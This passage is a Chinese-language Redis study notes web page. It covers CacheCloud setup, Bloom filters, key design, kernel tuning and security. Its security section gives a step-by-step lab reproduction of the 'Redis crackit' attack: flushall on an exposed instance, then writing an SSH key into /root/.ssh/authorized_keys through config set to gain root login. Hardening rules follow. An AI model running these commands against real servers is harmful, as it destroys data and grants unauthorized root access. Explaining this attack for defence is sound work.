id="参考-https-github-com-sohutv-cachecloud-wiki-3-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-ab-af-e6-8e-a5-e5-85-a5-e6-96-87-e6-a1-a3"><a href="#参考-https-github-com-sohutv-cachecloud-wiki-3-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-ab-af-e6-8e-a5-e5-85-a5-e6-96-87-e6-a1-a3" class="header-anchor">#</a> 参考：<a href="https://github.com/sohutv/cachecloud/wiki/3.%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%8E%A5%E5%85%A5%E6%96%87%E6%A1%A3" target="_blank" rel="noopener noreferrer">https://github.com/sohutv/cachecloud/wiki/3.%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%8E%A5%E5%85%A5%E6%96%87%E6%A1%A3<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#下载项目</span>
+<span class="token builtin class-name">cd</span> /opt
+<span class="token function">git</span> clone https://github.com/sohutv/cachecloud.git
+
+<span class="token comment">#导入数据库</span>
+mysql -uroot -p
+create database cachecloud<span class="token punctuation">;</span>
+use cachecloud<span class="token punctuation">;</span>
+<span class="token builtin class-name">source</span> /opt/cachecloud/script/cachecloud.sql
+
+<span class="token comment">#本地 修改配置文件local.properties</span>
+<span class="token function">vim</span> /opt/cachecloud/cachecloud-open-web/src/main/swap/local.properties
+<span class="token comment">#生产环境 修改配置文件online.properties</span>
+<span class="token function">vim</span> /opt/cachecloud/cachecloud-open-web/src/main/swap/online.properties
+
+<span class="token comment">#本地启动</span>
+<span class="token comment">#在cachecloud根目录下运行</span>
+<span class="token builtin class-name">cd</span> /opt/cachecloud
+mvn clean compile <span class="token function">install</span> -Plocal
+<span class="token comment">#在cachecloud-open-web模块下运行</span>
+<span class="token builtin class-name">cd</span> /opt/cachecloud/cachecloud-open-web
+mvn spring-boot:run
+
+<span class="token comment">#生产环境启动</span>
+<span class="token comment">#在cachecloud根目录下运行</span>
+mvn clean compile <span class="token function">install</span> -Ponline
+<span class="token comment">#拷贝war包(cachecloud-open-web/target/cachecloud-open-web-1.0-SNAPSHOT.war)到/opt/cachecloud-web下</span>
+<span class="token function">mkdir</span> /opt/cachecloud-web
+<span class="token function">cp</span> /opt/cachecloud/cachecloud-open-web/target/cachecloud-open-web-1.0-SNAPSHOT.war /opt/cachecloud-web/
+<span class="token comment">#拷贝配置文件(cachecloud-open-web/src/main/resources/cachecloud-web.conf)到/opt/cachecloud-web下，并改名为cachecloud-open-web-1.0-SNAPSHOT.conf（spring-boot要求，否则配置不生效）</span>
+<span class="token function">cp</span> /opt/cachecloud/cachecloud-open-web/src/main/resources/cachecloud-web.conf /opt/cachecloud-web/
+<span class="token builtin class-name">cd</span> /opt/cachecloud-web/
+<span class="token function">mv</span> cachecloud-web.conf cachecloud-open-web-1.0-SNAPSHOT.conf
+<span class="token comment">#启动方法1(作为系统服务启动，可能存在系统兼容性问题，目前redhat6.5,centos7正常)</span>
+<span class="token function">sudo</span> <span class="token function">ln</span> -s /opt/cachecloud-web/cachecloud-open-web-1.0-SNAPSHOT.war /etc/init.d/cachecloud-web
+/etc/init.d/cachecloud-web start
+<span class="token comment">#启动方法2(使用脚本启动，大部分操作系统都正常) 拷贝启动脚本(cachecloud根目录下script目录下的start.sh和stop.sh)到/opt/cachecloud-web下</span>
+<span class="token function">cp</span> /opt/cachecloud/script/start.sh /opt/cachecloud-web/
+<span class="token function">cp</span> /opt/cachecloud/script/stop.sh /opt/cachecloud-web/
+<span class="token function">sh</span> start.sh <span class="token comment">#如果机器内存不足，可以适当调小:-Xmx和-Xms(默认是4g)</span>
+<span class="token function">sh</span> stop.sh
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><p>local.properties 和 online.properties 属性配置</p> <table><thead><tr><th style="text-align:center;">属性名</th> <th style="text-align:center;">说明</th> <th style="text-align:center;">示例</th></tr></thead> <tbody><tr><td style="text-align:center;">cachecloud.db.url</td> <td style="text-align:center;">mysql 驱动 url</td> <td style="text-align:center;">jdbc:mysql://127.0.0.1:3306/cache-cloud</td></tr> <tr><td style="text-align:center;">cachecloud.db.user</td> <td style="text-align:center;">mysql 用户名</td> <td style="text-align:center;">admin</td></tr> <tr><td style="text-align:center;">cachecloud.db.password</td> <td style="text-align:center;">mysql 密码</td> <td style="text-align:center;">admin</td></tr> <tr><td style="text-align:center;">web.port</td> <td style="text-align:center;">spring-boot 内嵌 tomcat 启动端口</td> <td style="text-align:center;">启动端口 测试 9999,线上 8585(可修改)</td></tr></tbody></table> <p>http://127.0.0.1:9999/manage/login 使用用户名:admin、密码:admin 访问系统</p> <h3 id="配置-4"><a href="#配置-4" class="header-anchor">#</a> 配置</h3> <ol><li>添加机器</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#用户名cachecloud和密码cachecloud要跟配置修改中的保持一样</span>
+<span class="token builtin class-name">cd</span> /opt/cachecloud/script
+<span class="token function">sh</span> cachecloud-init.sh cachecloud
+cachecloud
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>进入后台管理，点击机器管理，添加新机器</p> <ol start="2"><li>添加应用</li></ol> <h2 id="布隆过滤器"><a href="#布隆过滤器" class="header-anchor">#</a> 布隆过滤器</h2> <p>实现原理：一个很长的二进制向量和若干个哈希函数
+参数：m 个二进制向量，n 个预备数据，k 个哈希函数</p> <h3 id="误差率"><a href="#误差率" class="header-anchor">#</a> 误差率</h3> <ul><li>肯定存在误差：恰好都命中了</li> <li>直观因素：m/n 的比率，hash 函数的个数</li> <li>m/n 与误差率成反比，k 与误差率成反比</li></ul> <h3 id="本地布隆过滤器"><a href="#本地布隆过滤器" class="header-anchor">#</a> 本地布隆过滤器</h3> <ul><li>现有库：guava</li></ul> <p>参考：<a href="http://ifeve.com/google-guava-hashing" target="_blank" rel="noopener noreferrer">http://ifeve.com/google-guava-hashing<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ul><li>本地布隆过滤器的问题：
+<ul><li>容量受限制</li> <li>多个应用存在多个布隆过滤器，构建同步复杂</li></ul></li></ul> <h3 id="redis-布隆过滤器"><a href="#redis-布隆过滤器" class="header-anchor">#</a> Redis 布隆过滤器</h3> <p>基于位图实现</p> <h4 id="实现方法"><a href="#实现方法" class="header-anchor">#</a> 实现方法</h4> <ul><li>定义布隆过滤器构造参数：m、n、k、误差率</li> <li>定义布隆过滤器操作函数：add 和 contain</li> <li>封装 Redis 位图操作</li> <li>开发测试样例</li></ul> <h4 id="基于-redis-单机实现存在的问题"><a href="#基于-redis-单机实现存在的问题" class="header-anchor">#</a> 基于 Redis 单机实现存在的问题</h4> <ul><li>速度慢：比本地慢，输出网络
+<ul><li>解决：单独部署，与应用同机房甚至机架部署</li></ul></li> <li>容量受限：Redis 最大字符串为 512MB、Redis 单机容量
+<ul><li>解决：基于 Redis Cluster 实现</li></ul></li></ul> <h3 id="redis-分布式布隆过滤器"><a href="#redis-分布式布隆过滤器" class="header-anchor">#</a> Redis 分布式布隆过滤器</h3> <ul><li>多个布隆过滤器：二次路由</li> <li>基于 Pipeline 提高效率</li></ul> <h2 id="开发规范"><a href="#开发规范" class="header-anchor">#</a> 开发规范</h2> <h3 id="键值设计"><a href="#键值设计" class="header-anchor">#</a> 键值设计</h3> <h4 id="key-设计"><a href="#key-设计" class="header-anchor">#</a> key 设计</h4> <ul><li>可读性和可管理性：以业务名(或数据库名)为前缀(防止 key 冲突)，用冒号分割，比如业务名:表名:id,如：ugc:video:1</li> <li>简洁性：保证语义的前提下，控制 key 的长度，当 key 较多，内存占用也不容忽视(redis3:39 字节 embstr)，如：user:{uid}:friends:messages:{mid}简化为 u:{uid}🇫🇷m:{mid}</li> <li>不要包含特殊字符：反例：包含空格、换行、单双引号以及其他转义字符</li></ul> <h4 id="value-设计"><a href="#value-设计" class="header-anchor">#</a> Value 设计</h4> <ul><li>拒绝 bigkey
+<ul><li>string 类型控制在 10KB 以内</li> <li>hash、list、set、zset 元素个数不要超过 5000</li></ul></li> <li>选择合适的数据结构</li> <li>过期设计</li></ul> <h4 id="bigkey-危害"><a href="#bigkey-危害" class="header-anchor">#</a> bigkey 危害</h4> <ul><li>网络阻塞</li> <li>Redis 阻塞</li> <li>集群节点数据不均衡</li> <li>频繁序列化：应用服务器 CPU 消耗</li></ul> <h4 id="bigkey-发现"><a href="#bigkey-发现" class="header-anchor">#</a> bigkey 发现</h4> <ul><li>应用异常</li> <li><code>redis-cli --bigkeys</code></li> <li>scan + debug object key</li> <li>主动报警：网络流量监控、客户端监控</li> <li>内核热点 key 问题优化</li></ul> <h4 id="bigkey-删除"><a href="#bigkey-删除" class="header-anchor">#</a> bigkey 删除</h4> <ol><li>阻塞：注意隐形删除(过期、rename 等)</li> <li>Redis4.0：lazy delete(unlink 命令)</li></ol> <h4 id="bigkey-预防"><a href="#bigkey-预防" class="header-anchor">#</a> bigkey 预防</h4> <ul><li>优化数据结构：例如二级拆分</li> <li>物理隔离或者万兆网卡：不是治标方案</li> <li>命令优化：hgetall-&gt;hmget、hscan</li> <li>报警和定期优化</li></ul> <h3 id="键值生命周期"><a href="#键值生命周期" class="header-anchor">#</a> 键值生命周期</h3> <ul><li>周期数据需要设置过期时间，<code>object idle time</code>可以找垃圾 key-value</li> <li>过期时间不宜集中：缓存穿透和雪崩等问题</li></ul> <h3 id="命令优化"><a href="#命令优化" class="header-anchor">#</a> 命令优化</h3> <ol><li>O(N)以上命令关注 N 的数量</li></ol> <p>例如：hgetall、lrange、smembers、zrange、sinter 等并非不能使用，但是需要明确 N 的值。有遍历的需求可以使用 hscan、sscan、zscan 代替</p> <ol start="2"><li>禁用命令</li></ol> <p>禁止线上使用 keys、flushall、flushdb 等，通过 redis 的 rename 机制禁掉命令，或者使用 scan 的方式渐进式处理</p> <ol start="3"><li>合理使用 select</li></ol> <ul><li>redis 的多数据库较弱，使用数字进行区分</li> <li>很多客户端支持较差</li> <li>同时多业务用多数据库实际还是单线程处理，会有干扰</li></ul> <ol start="4"><li>使用批量操作提高效率</li></ol> <p>原生命令：例如 mget、mset</p> <p>非原生命令：可以使用 pipeline 提高效率。 但要注意控制一次批量操作的元素个数(例如 500 以内，实际也和元素字节数有关)</p> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>注意两者不同：</p> <p>原生是原子操作，pipeline 是非原子操作</p> <p>pipeline 可以打包不同的命令，原生做不到</p> <p>pipeline 需要客户端和服务端同时支持</p></div> <ol start="5"><li>Redis 事务功能较弱，不建议过多使用</li></ol> <ul><li>Redis 的事务功能较弱(不支持回滚)</li> <li>集群版本(自研和官方)要求一次事务操作的 key 必须在一个 slot 上(可以使用 hashtag 功能解决)</li></ul> <ol start="6"><li>Redis 集群版本在使用 Lua 上有特殊要求</li></ol> <ul><li>所有 key，必须在 1 个 slot 上，否则直接返回 error</li> <li>&quot;-ERR eval/evalsha command keys must in same slot\r\n&quot;</li></ul> <ol start="7"><li>必要情况下使用 monitor 命令时，要注意不要长时间使用</li></ol> <h3 id="客户端优化"><a href="#客户端优化" class="header-anchor">#</a> 客户端优化</h3> <ol><li>避免多个应用使用一个 Redis 实例</li></ol> <p>正例：不相干的业务拆分，公共数据做服务化。</p> <ol start="2"><li><p>使用带有连接池的数据库，可以有效控制连接，同时提高效率</p></li> <li><p>高并发下建议客户端添加熔断功能(例如 netflix hystrix)</p></li> <li><p>设置合理的密码，如有必要可以使用 SSL 加密访问（阿里云 Redis 支持）</p></li> <li><p>根据自身业务类型，选好 maxmemory-policy(最大内存淘汰策略)，设置好过期时间</p></li></ol> <p>默认策略是 volatile-lru，即超过最大内存后，在过期键中使用 lru 算法进行 key 的剔除，保证不过期数据不被删除，但是可能会出现 OOM 问题。</p> <p>其他策略如下：</p> <p>allkeys-lru：根据 LRU 算法删除键，不管数据有没有设置超时属性，直到腾出足够空间为止</p> <p>allkeys-random：随机删除所有键，直到腾出足够空间为止</p> <p>volatile-random: 随机删除过期键，直到腾出足够空间为止</p> <p>volatile-ttl：根据键值对象的 ttl 属性，删除最近将要过期数据。如果没有，回退到 noeviction 策略</p> <p>noeviction：不会剔除任何数据，拒绝所有写入操作并返回客户端错误信息”(error) OOM command not allowed when used memory”，此时 Redis 只响应读操作</p> <h2 id="开发运维"><a href="#开发运维" class="header-anchor">#</a> 开发运维</h2> <h3 id="linux-内核优化"><a href="#linux-内核优化" class="header-anchor">#</a> Linux 内核优化</h3> <ul><li>vm.overcommit_memory</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#获取</span>
+<span class="token function">cat</span> /proc/sys/vm/overcommit_memory
+<span class="token comment">#设置</span>
+<span class="token comment">#echo &quot;vm.overcommit_memory=1&quot; &gt;&gt; /etc/sysctl.conf</span>
+sysctl vm.overcommit_memory<span class="token operator">=</span><span class="token number">1</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><ol><li>Redis 设置合理的 maxmemory，保证机器有 20%~30%的闲置内存</li> <li>集中化管理 AOF 重写和 RDB 的 bgsave</li> <li>设置 vm.overcommit_memory=1，防止极端情况下会造成 fork 失败</li></ol> <ul><li>swappiness</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#立即生效</span>
+<span class="token builtin class-name">echo</span> <span class="token punctuation">{</span>bestvalue<span class="token punctuation">}</span> <span class="token operator">&gt;</span> /proc/sys/vm/swappiness
+<span class="token comment">#永久生效</span>
+<span class="token builtin class-name">echo</span> vm.swappiness<span class="token operator">=</span><span class="token punctuation">{</span>bestvalue<span class="token punctuation">}</span> <span class="token operator">&gt;&gt;</span> /etc/sysctl.conf
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>如果 Linux&gt;3.5， vm.swappiness=1，否则 vm.swappiness=0，从而实现如下两个目标：</p> <ul><li>物理内存充足时候，使 Redis 足够快</li> <li>物理内存不足时候，避免 Redis 死掉(如果当前 Redis 为高可用，死掉比阻塞更好)</li> <li>THP(Transparent huge page)</li></ul> <ol><li>作用加速 fork</li> <li>建议：禁用，可能产生更大的内存开销</li> <li>坑：源码中是绝对路径，注意不同发行版本的区别</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token builtin class-name">echo</span> never <span class="token operator">&gt;</span> /sys/kernel/mm/transparent_hugepage/enabled
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>OOM killer</li></ul> <ol><li>作用：内存使用溢出，操作系统按照规则 kill 掉某些进程</li> <li>配置方法：/proc/{progress_id}/oom_adj 越小，被杀掉概率越小</li> <li>运维经验：不要过度依赖此特性，应该合理管理内存</li></ol> <ul><li><p>NTP(Net Time Protocol)
+对时</p></li> <li><p>ulimit</p></li> <li><p>TCP backlog</p></li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">cat</span> /proc/sys/net/core/somaxconn
+<span class="token builtin class-name">echo</span> <span class="token number">511</span> <span class="token operator">&gt;</span> /proc/sys/net/core/somaxconn
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="安全"><a href="#安全" class="header-anchor">#</a> 安全</h3> <h4 id="redis-crackit-漏洞"><a href="#redis-crackit-漏洞" class="header-anchor">#</a> Redis crackit 漏洞</h4> <p>参考：<a href="https://www.aneasystone.com/archives/2015/11/redis-crackit.html" target="_blank" rel="noopener noreferrer">https://www.aneasystone.com/archives/2015/11/redis-crackit.html<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ol><li>首先确认当前(攻击前)机器 A 不能通过 ssh 访问机器 B，因为没有权限</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">ssh</span> root@192.168.153.130
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>由于机器 B 的外网对外开题了 Redis 的 6379 端口，所以可以直接连接到 Redis 上执行 flushall 操作，注意此时破坏性已经很大了</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-cli -h <span class="token number">192.168</span>.153.130 -p <span class="token number">6379</span> <span class="token function">ping</span>
+redis-cli -h <span class="token number">192.168</span>.153.130 -p <span class="token number">6379</span> flushall
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="3"><li>在机器 A 生成公钥，并将公钥保存到一个文件 my.pub 中</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>ssh-keygen -t rsa
+<span class="token punctuation">(</span>echo -e <span class="token string">&quot;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&quot;</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&quot;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> my.pub
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="4"><li>将公钥作为 value 添加到 Redis 中</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">cat</span> my.pub <span class="token operator">|</span> redis-cli -h <span class="token number">192.168</span>.153.130 -p <span class="token number">6379</span> -x <span class="token builtin class-name">set</span> crackit
+redis-cli -h <span class="token number">192.168</span>.153.130 -p <span class="token number">6379</span> get crackit
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="5"><li>将 Redis 的 dir 设置为 /root/.ssh/目录，dbfilename 设置为 authorized_keys</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/
+config <span class="token builtin class-name">set</span> dbfilename authorized_keys
+save
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ol start="6"><li>此时再次通过 ssh 协议访问机器 B，发现顺利登陆</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">ssh</span> root@192.168.153.130
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>登陆后可以观察/root/.ssh/authorized_keys，可以发现它就是 RDB 文件</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">cat</span> /root/.ssh/authorized_keys
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="安全法则"><a href="#安全法则" class="header-anchor">#</a> 安全法则</h4> <ol><li>设置密码</li></ol> <ul><li>服务端配置：requirepass 和 masterauth</li> <li>客户端连接：auth 命令和-a 参数</li> <li>相关建议：
+<ul><li>密码要足够复杂，防止暴力破解</li> <li>masterauth 不要忘记</li> <li>auth 还是通过明文传输</li></ul></li></ul> <ol start="2"><li>伪装危险命令</li></ol> <ul><li>服务端配置：rename-command 为空或者随机字符</li> <li>客户端连接：不可用或者使用指定随机字符</li> <li>相关建议：
+<ul><li>不支持 config set 动态设置</li> <li>RDB 和 AOF 如果包含 rename-command 之前的命令，将无法使用</li> <li>rename-command 命令本身是在 Redis 内核会使用到，不建议设置</li></ul></li></ul> <ol start="3"><li>bind</li></ol> <ul><li>服务端配置：bind 限制的是网卡，并不是客户端 ip</li> <li>相关建议：
+<ul><li>bind 不支持 config set</li> <li>bind 127.0.0.1 需要谨慎</li> <li>如果存在外网网卡尽量屏蔽掉</li></ul></li></ul> <ol start="4"><li>防火墙</li> <li>定期备份</li> <li>不使用默认端口，防止被弱攻击杀掉</li> <li>使用非 root 用户启动</li></ol></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/lalifeier/awesome-notes/edit/master/docs/backend/database/Redis/README.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">10/17/2020, 10:44:36 AM</span></div></footer> <!----> </main></div><div class="global-ui"><!----><!----></div></div>
+    <script src="/assets/js/app.2630ad2b.js" defer></script><script src="/assets/js/2.ba37855e.js" defer></script><script src="/assets/js/16.0db907f7.js" defer></script><script src="/assets/js/5.65b8a4d7.js" defer></script>
+  </body>
+</html>
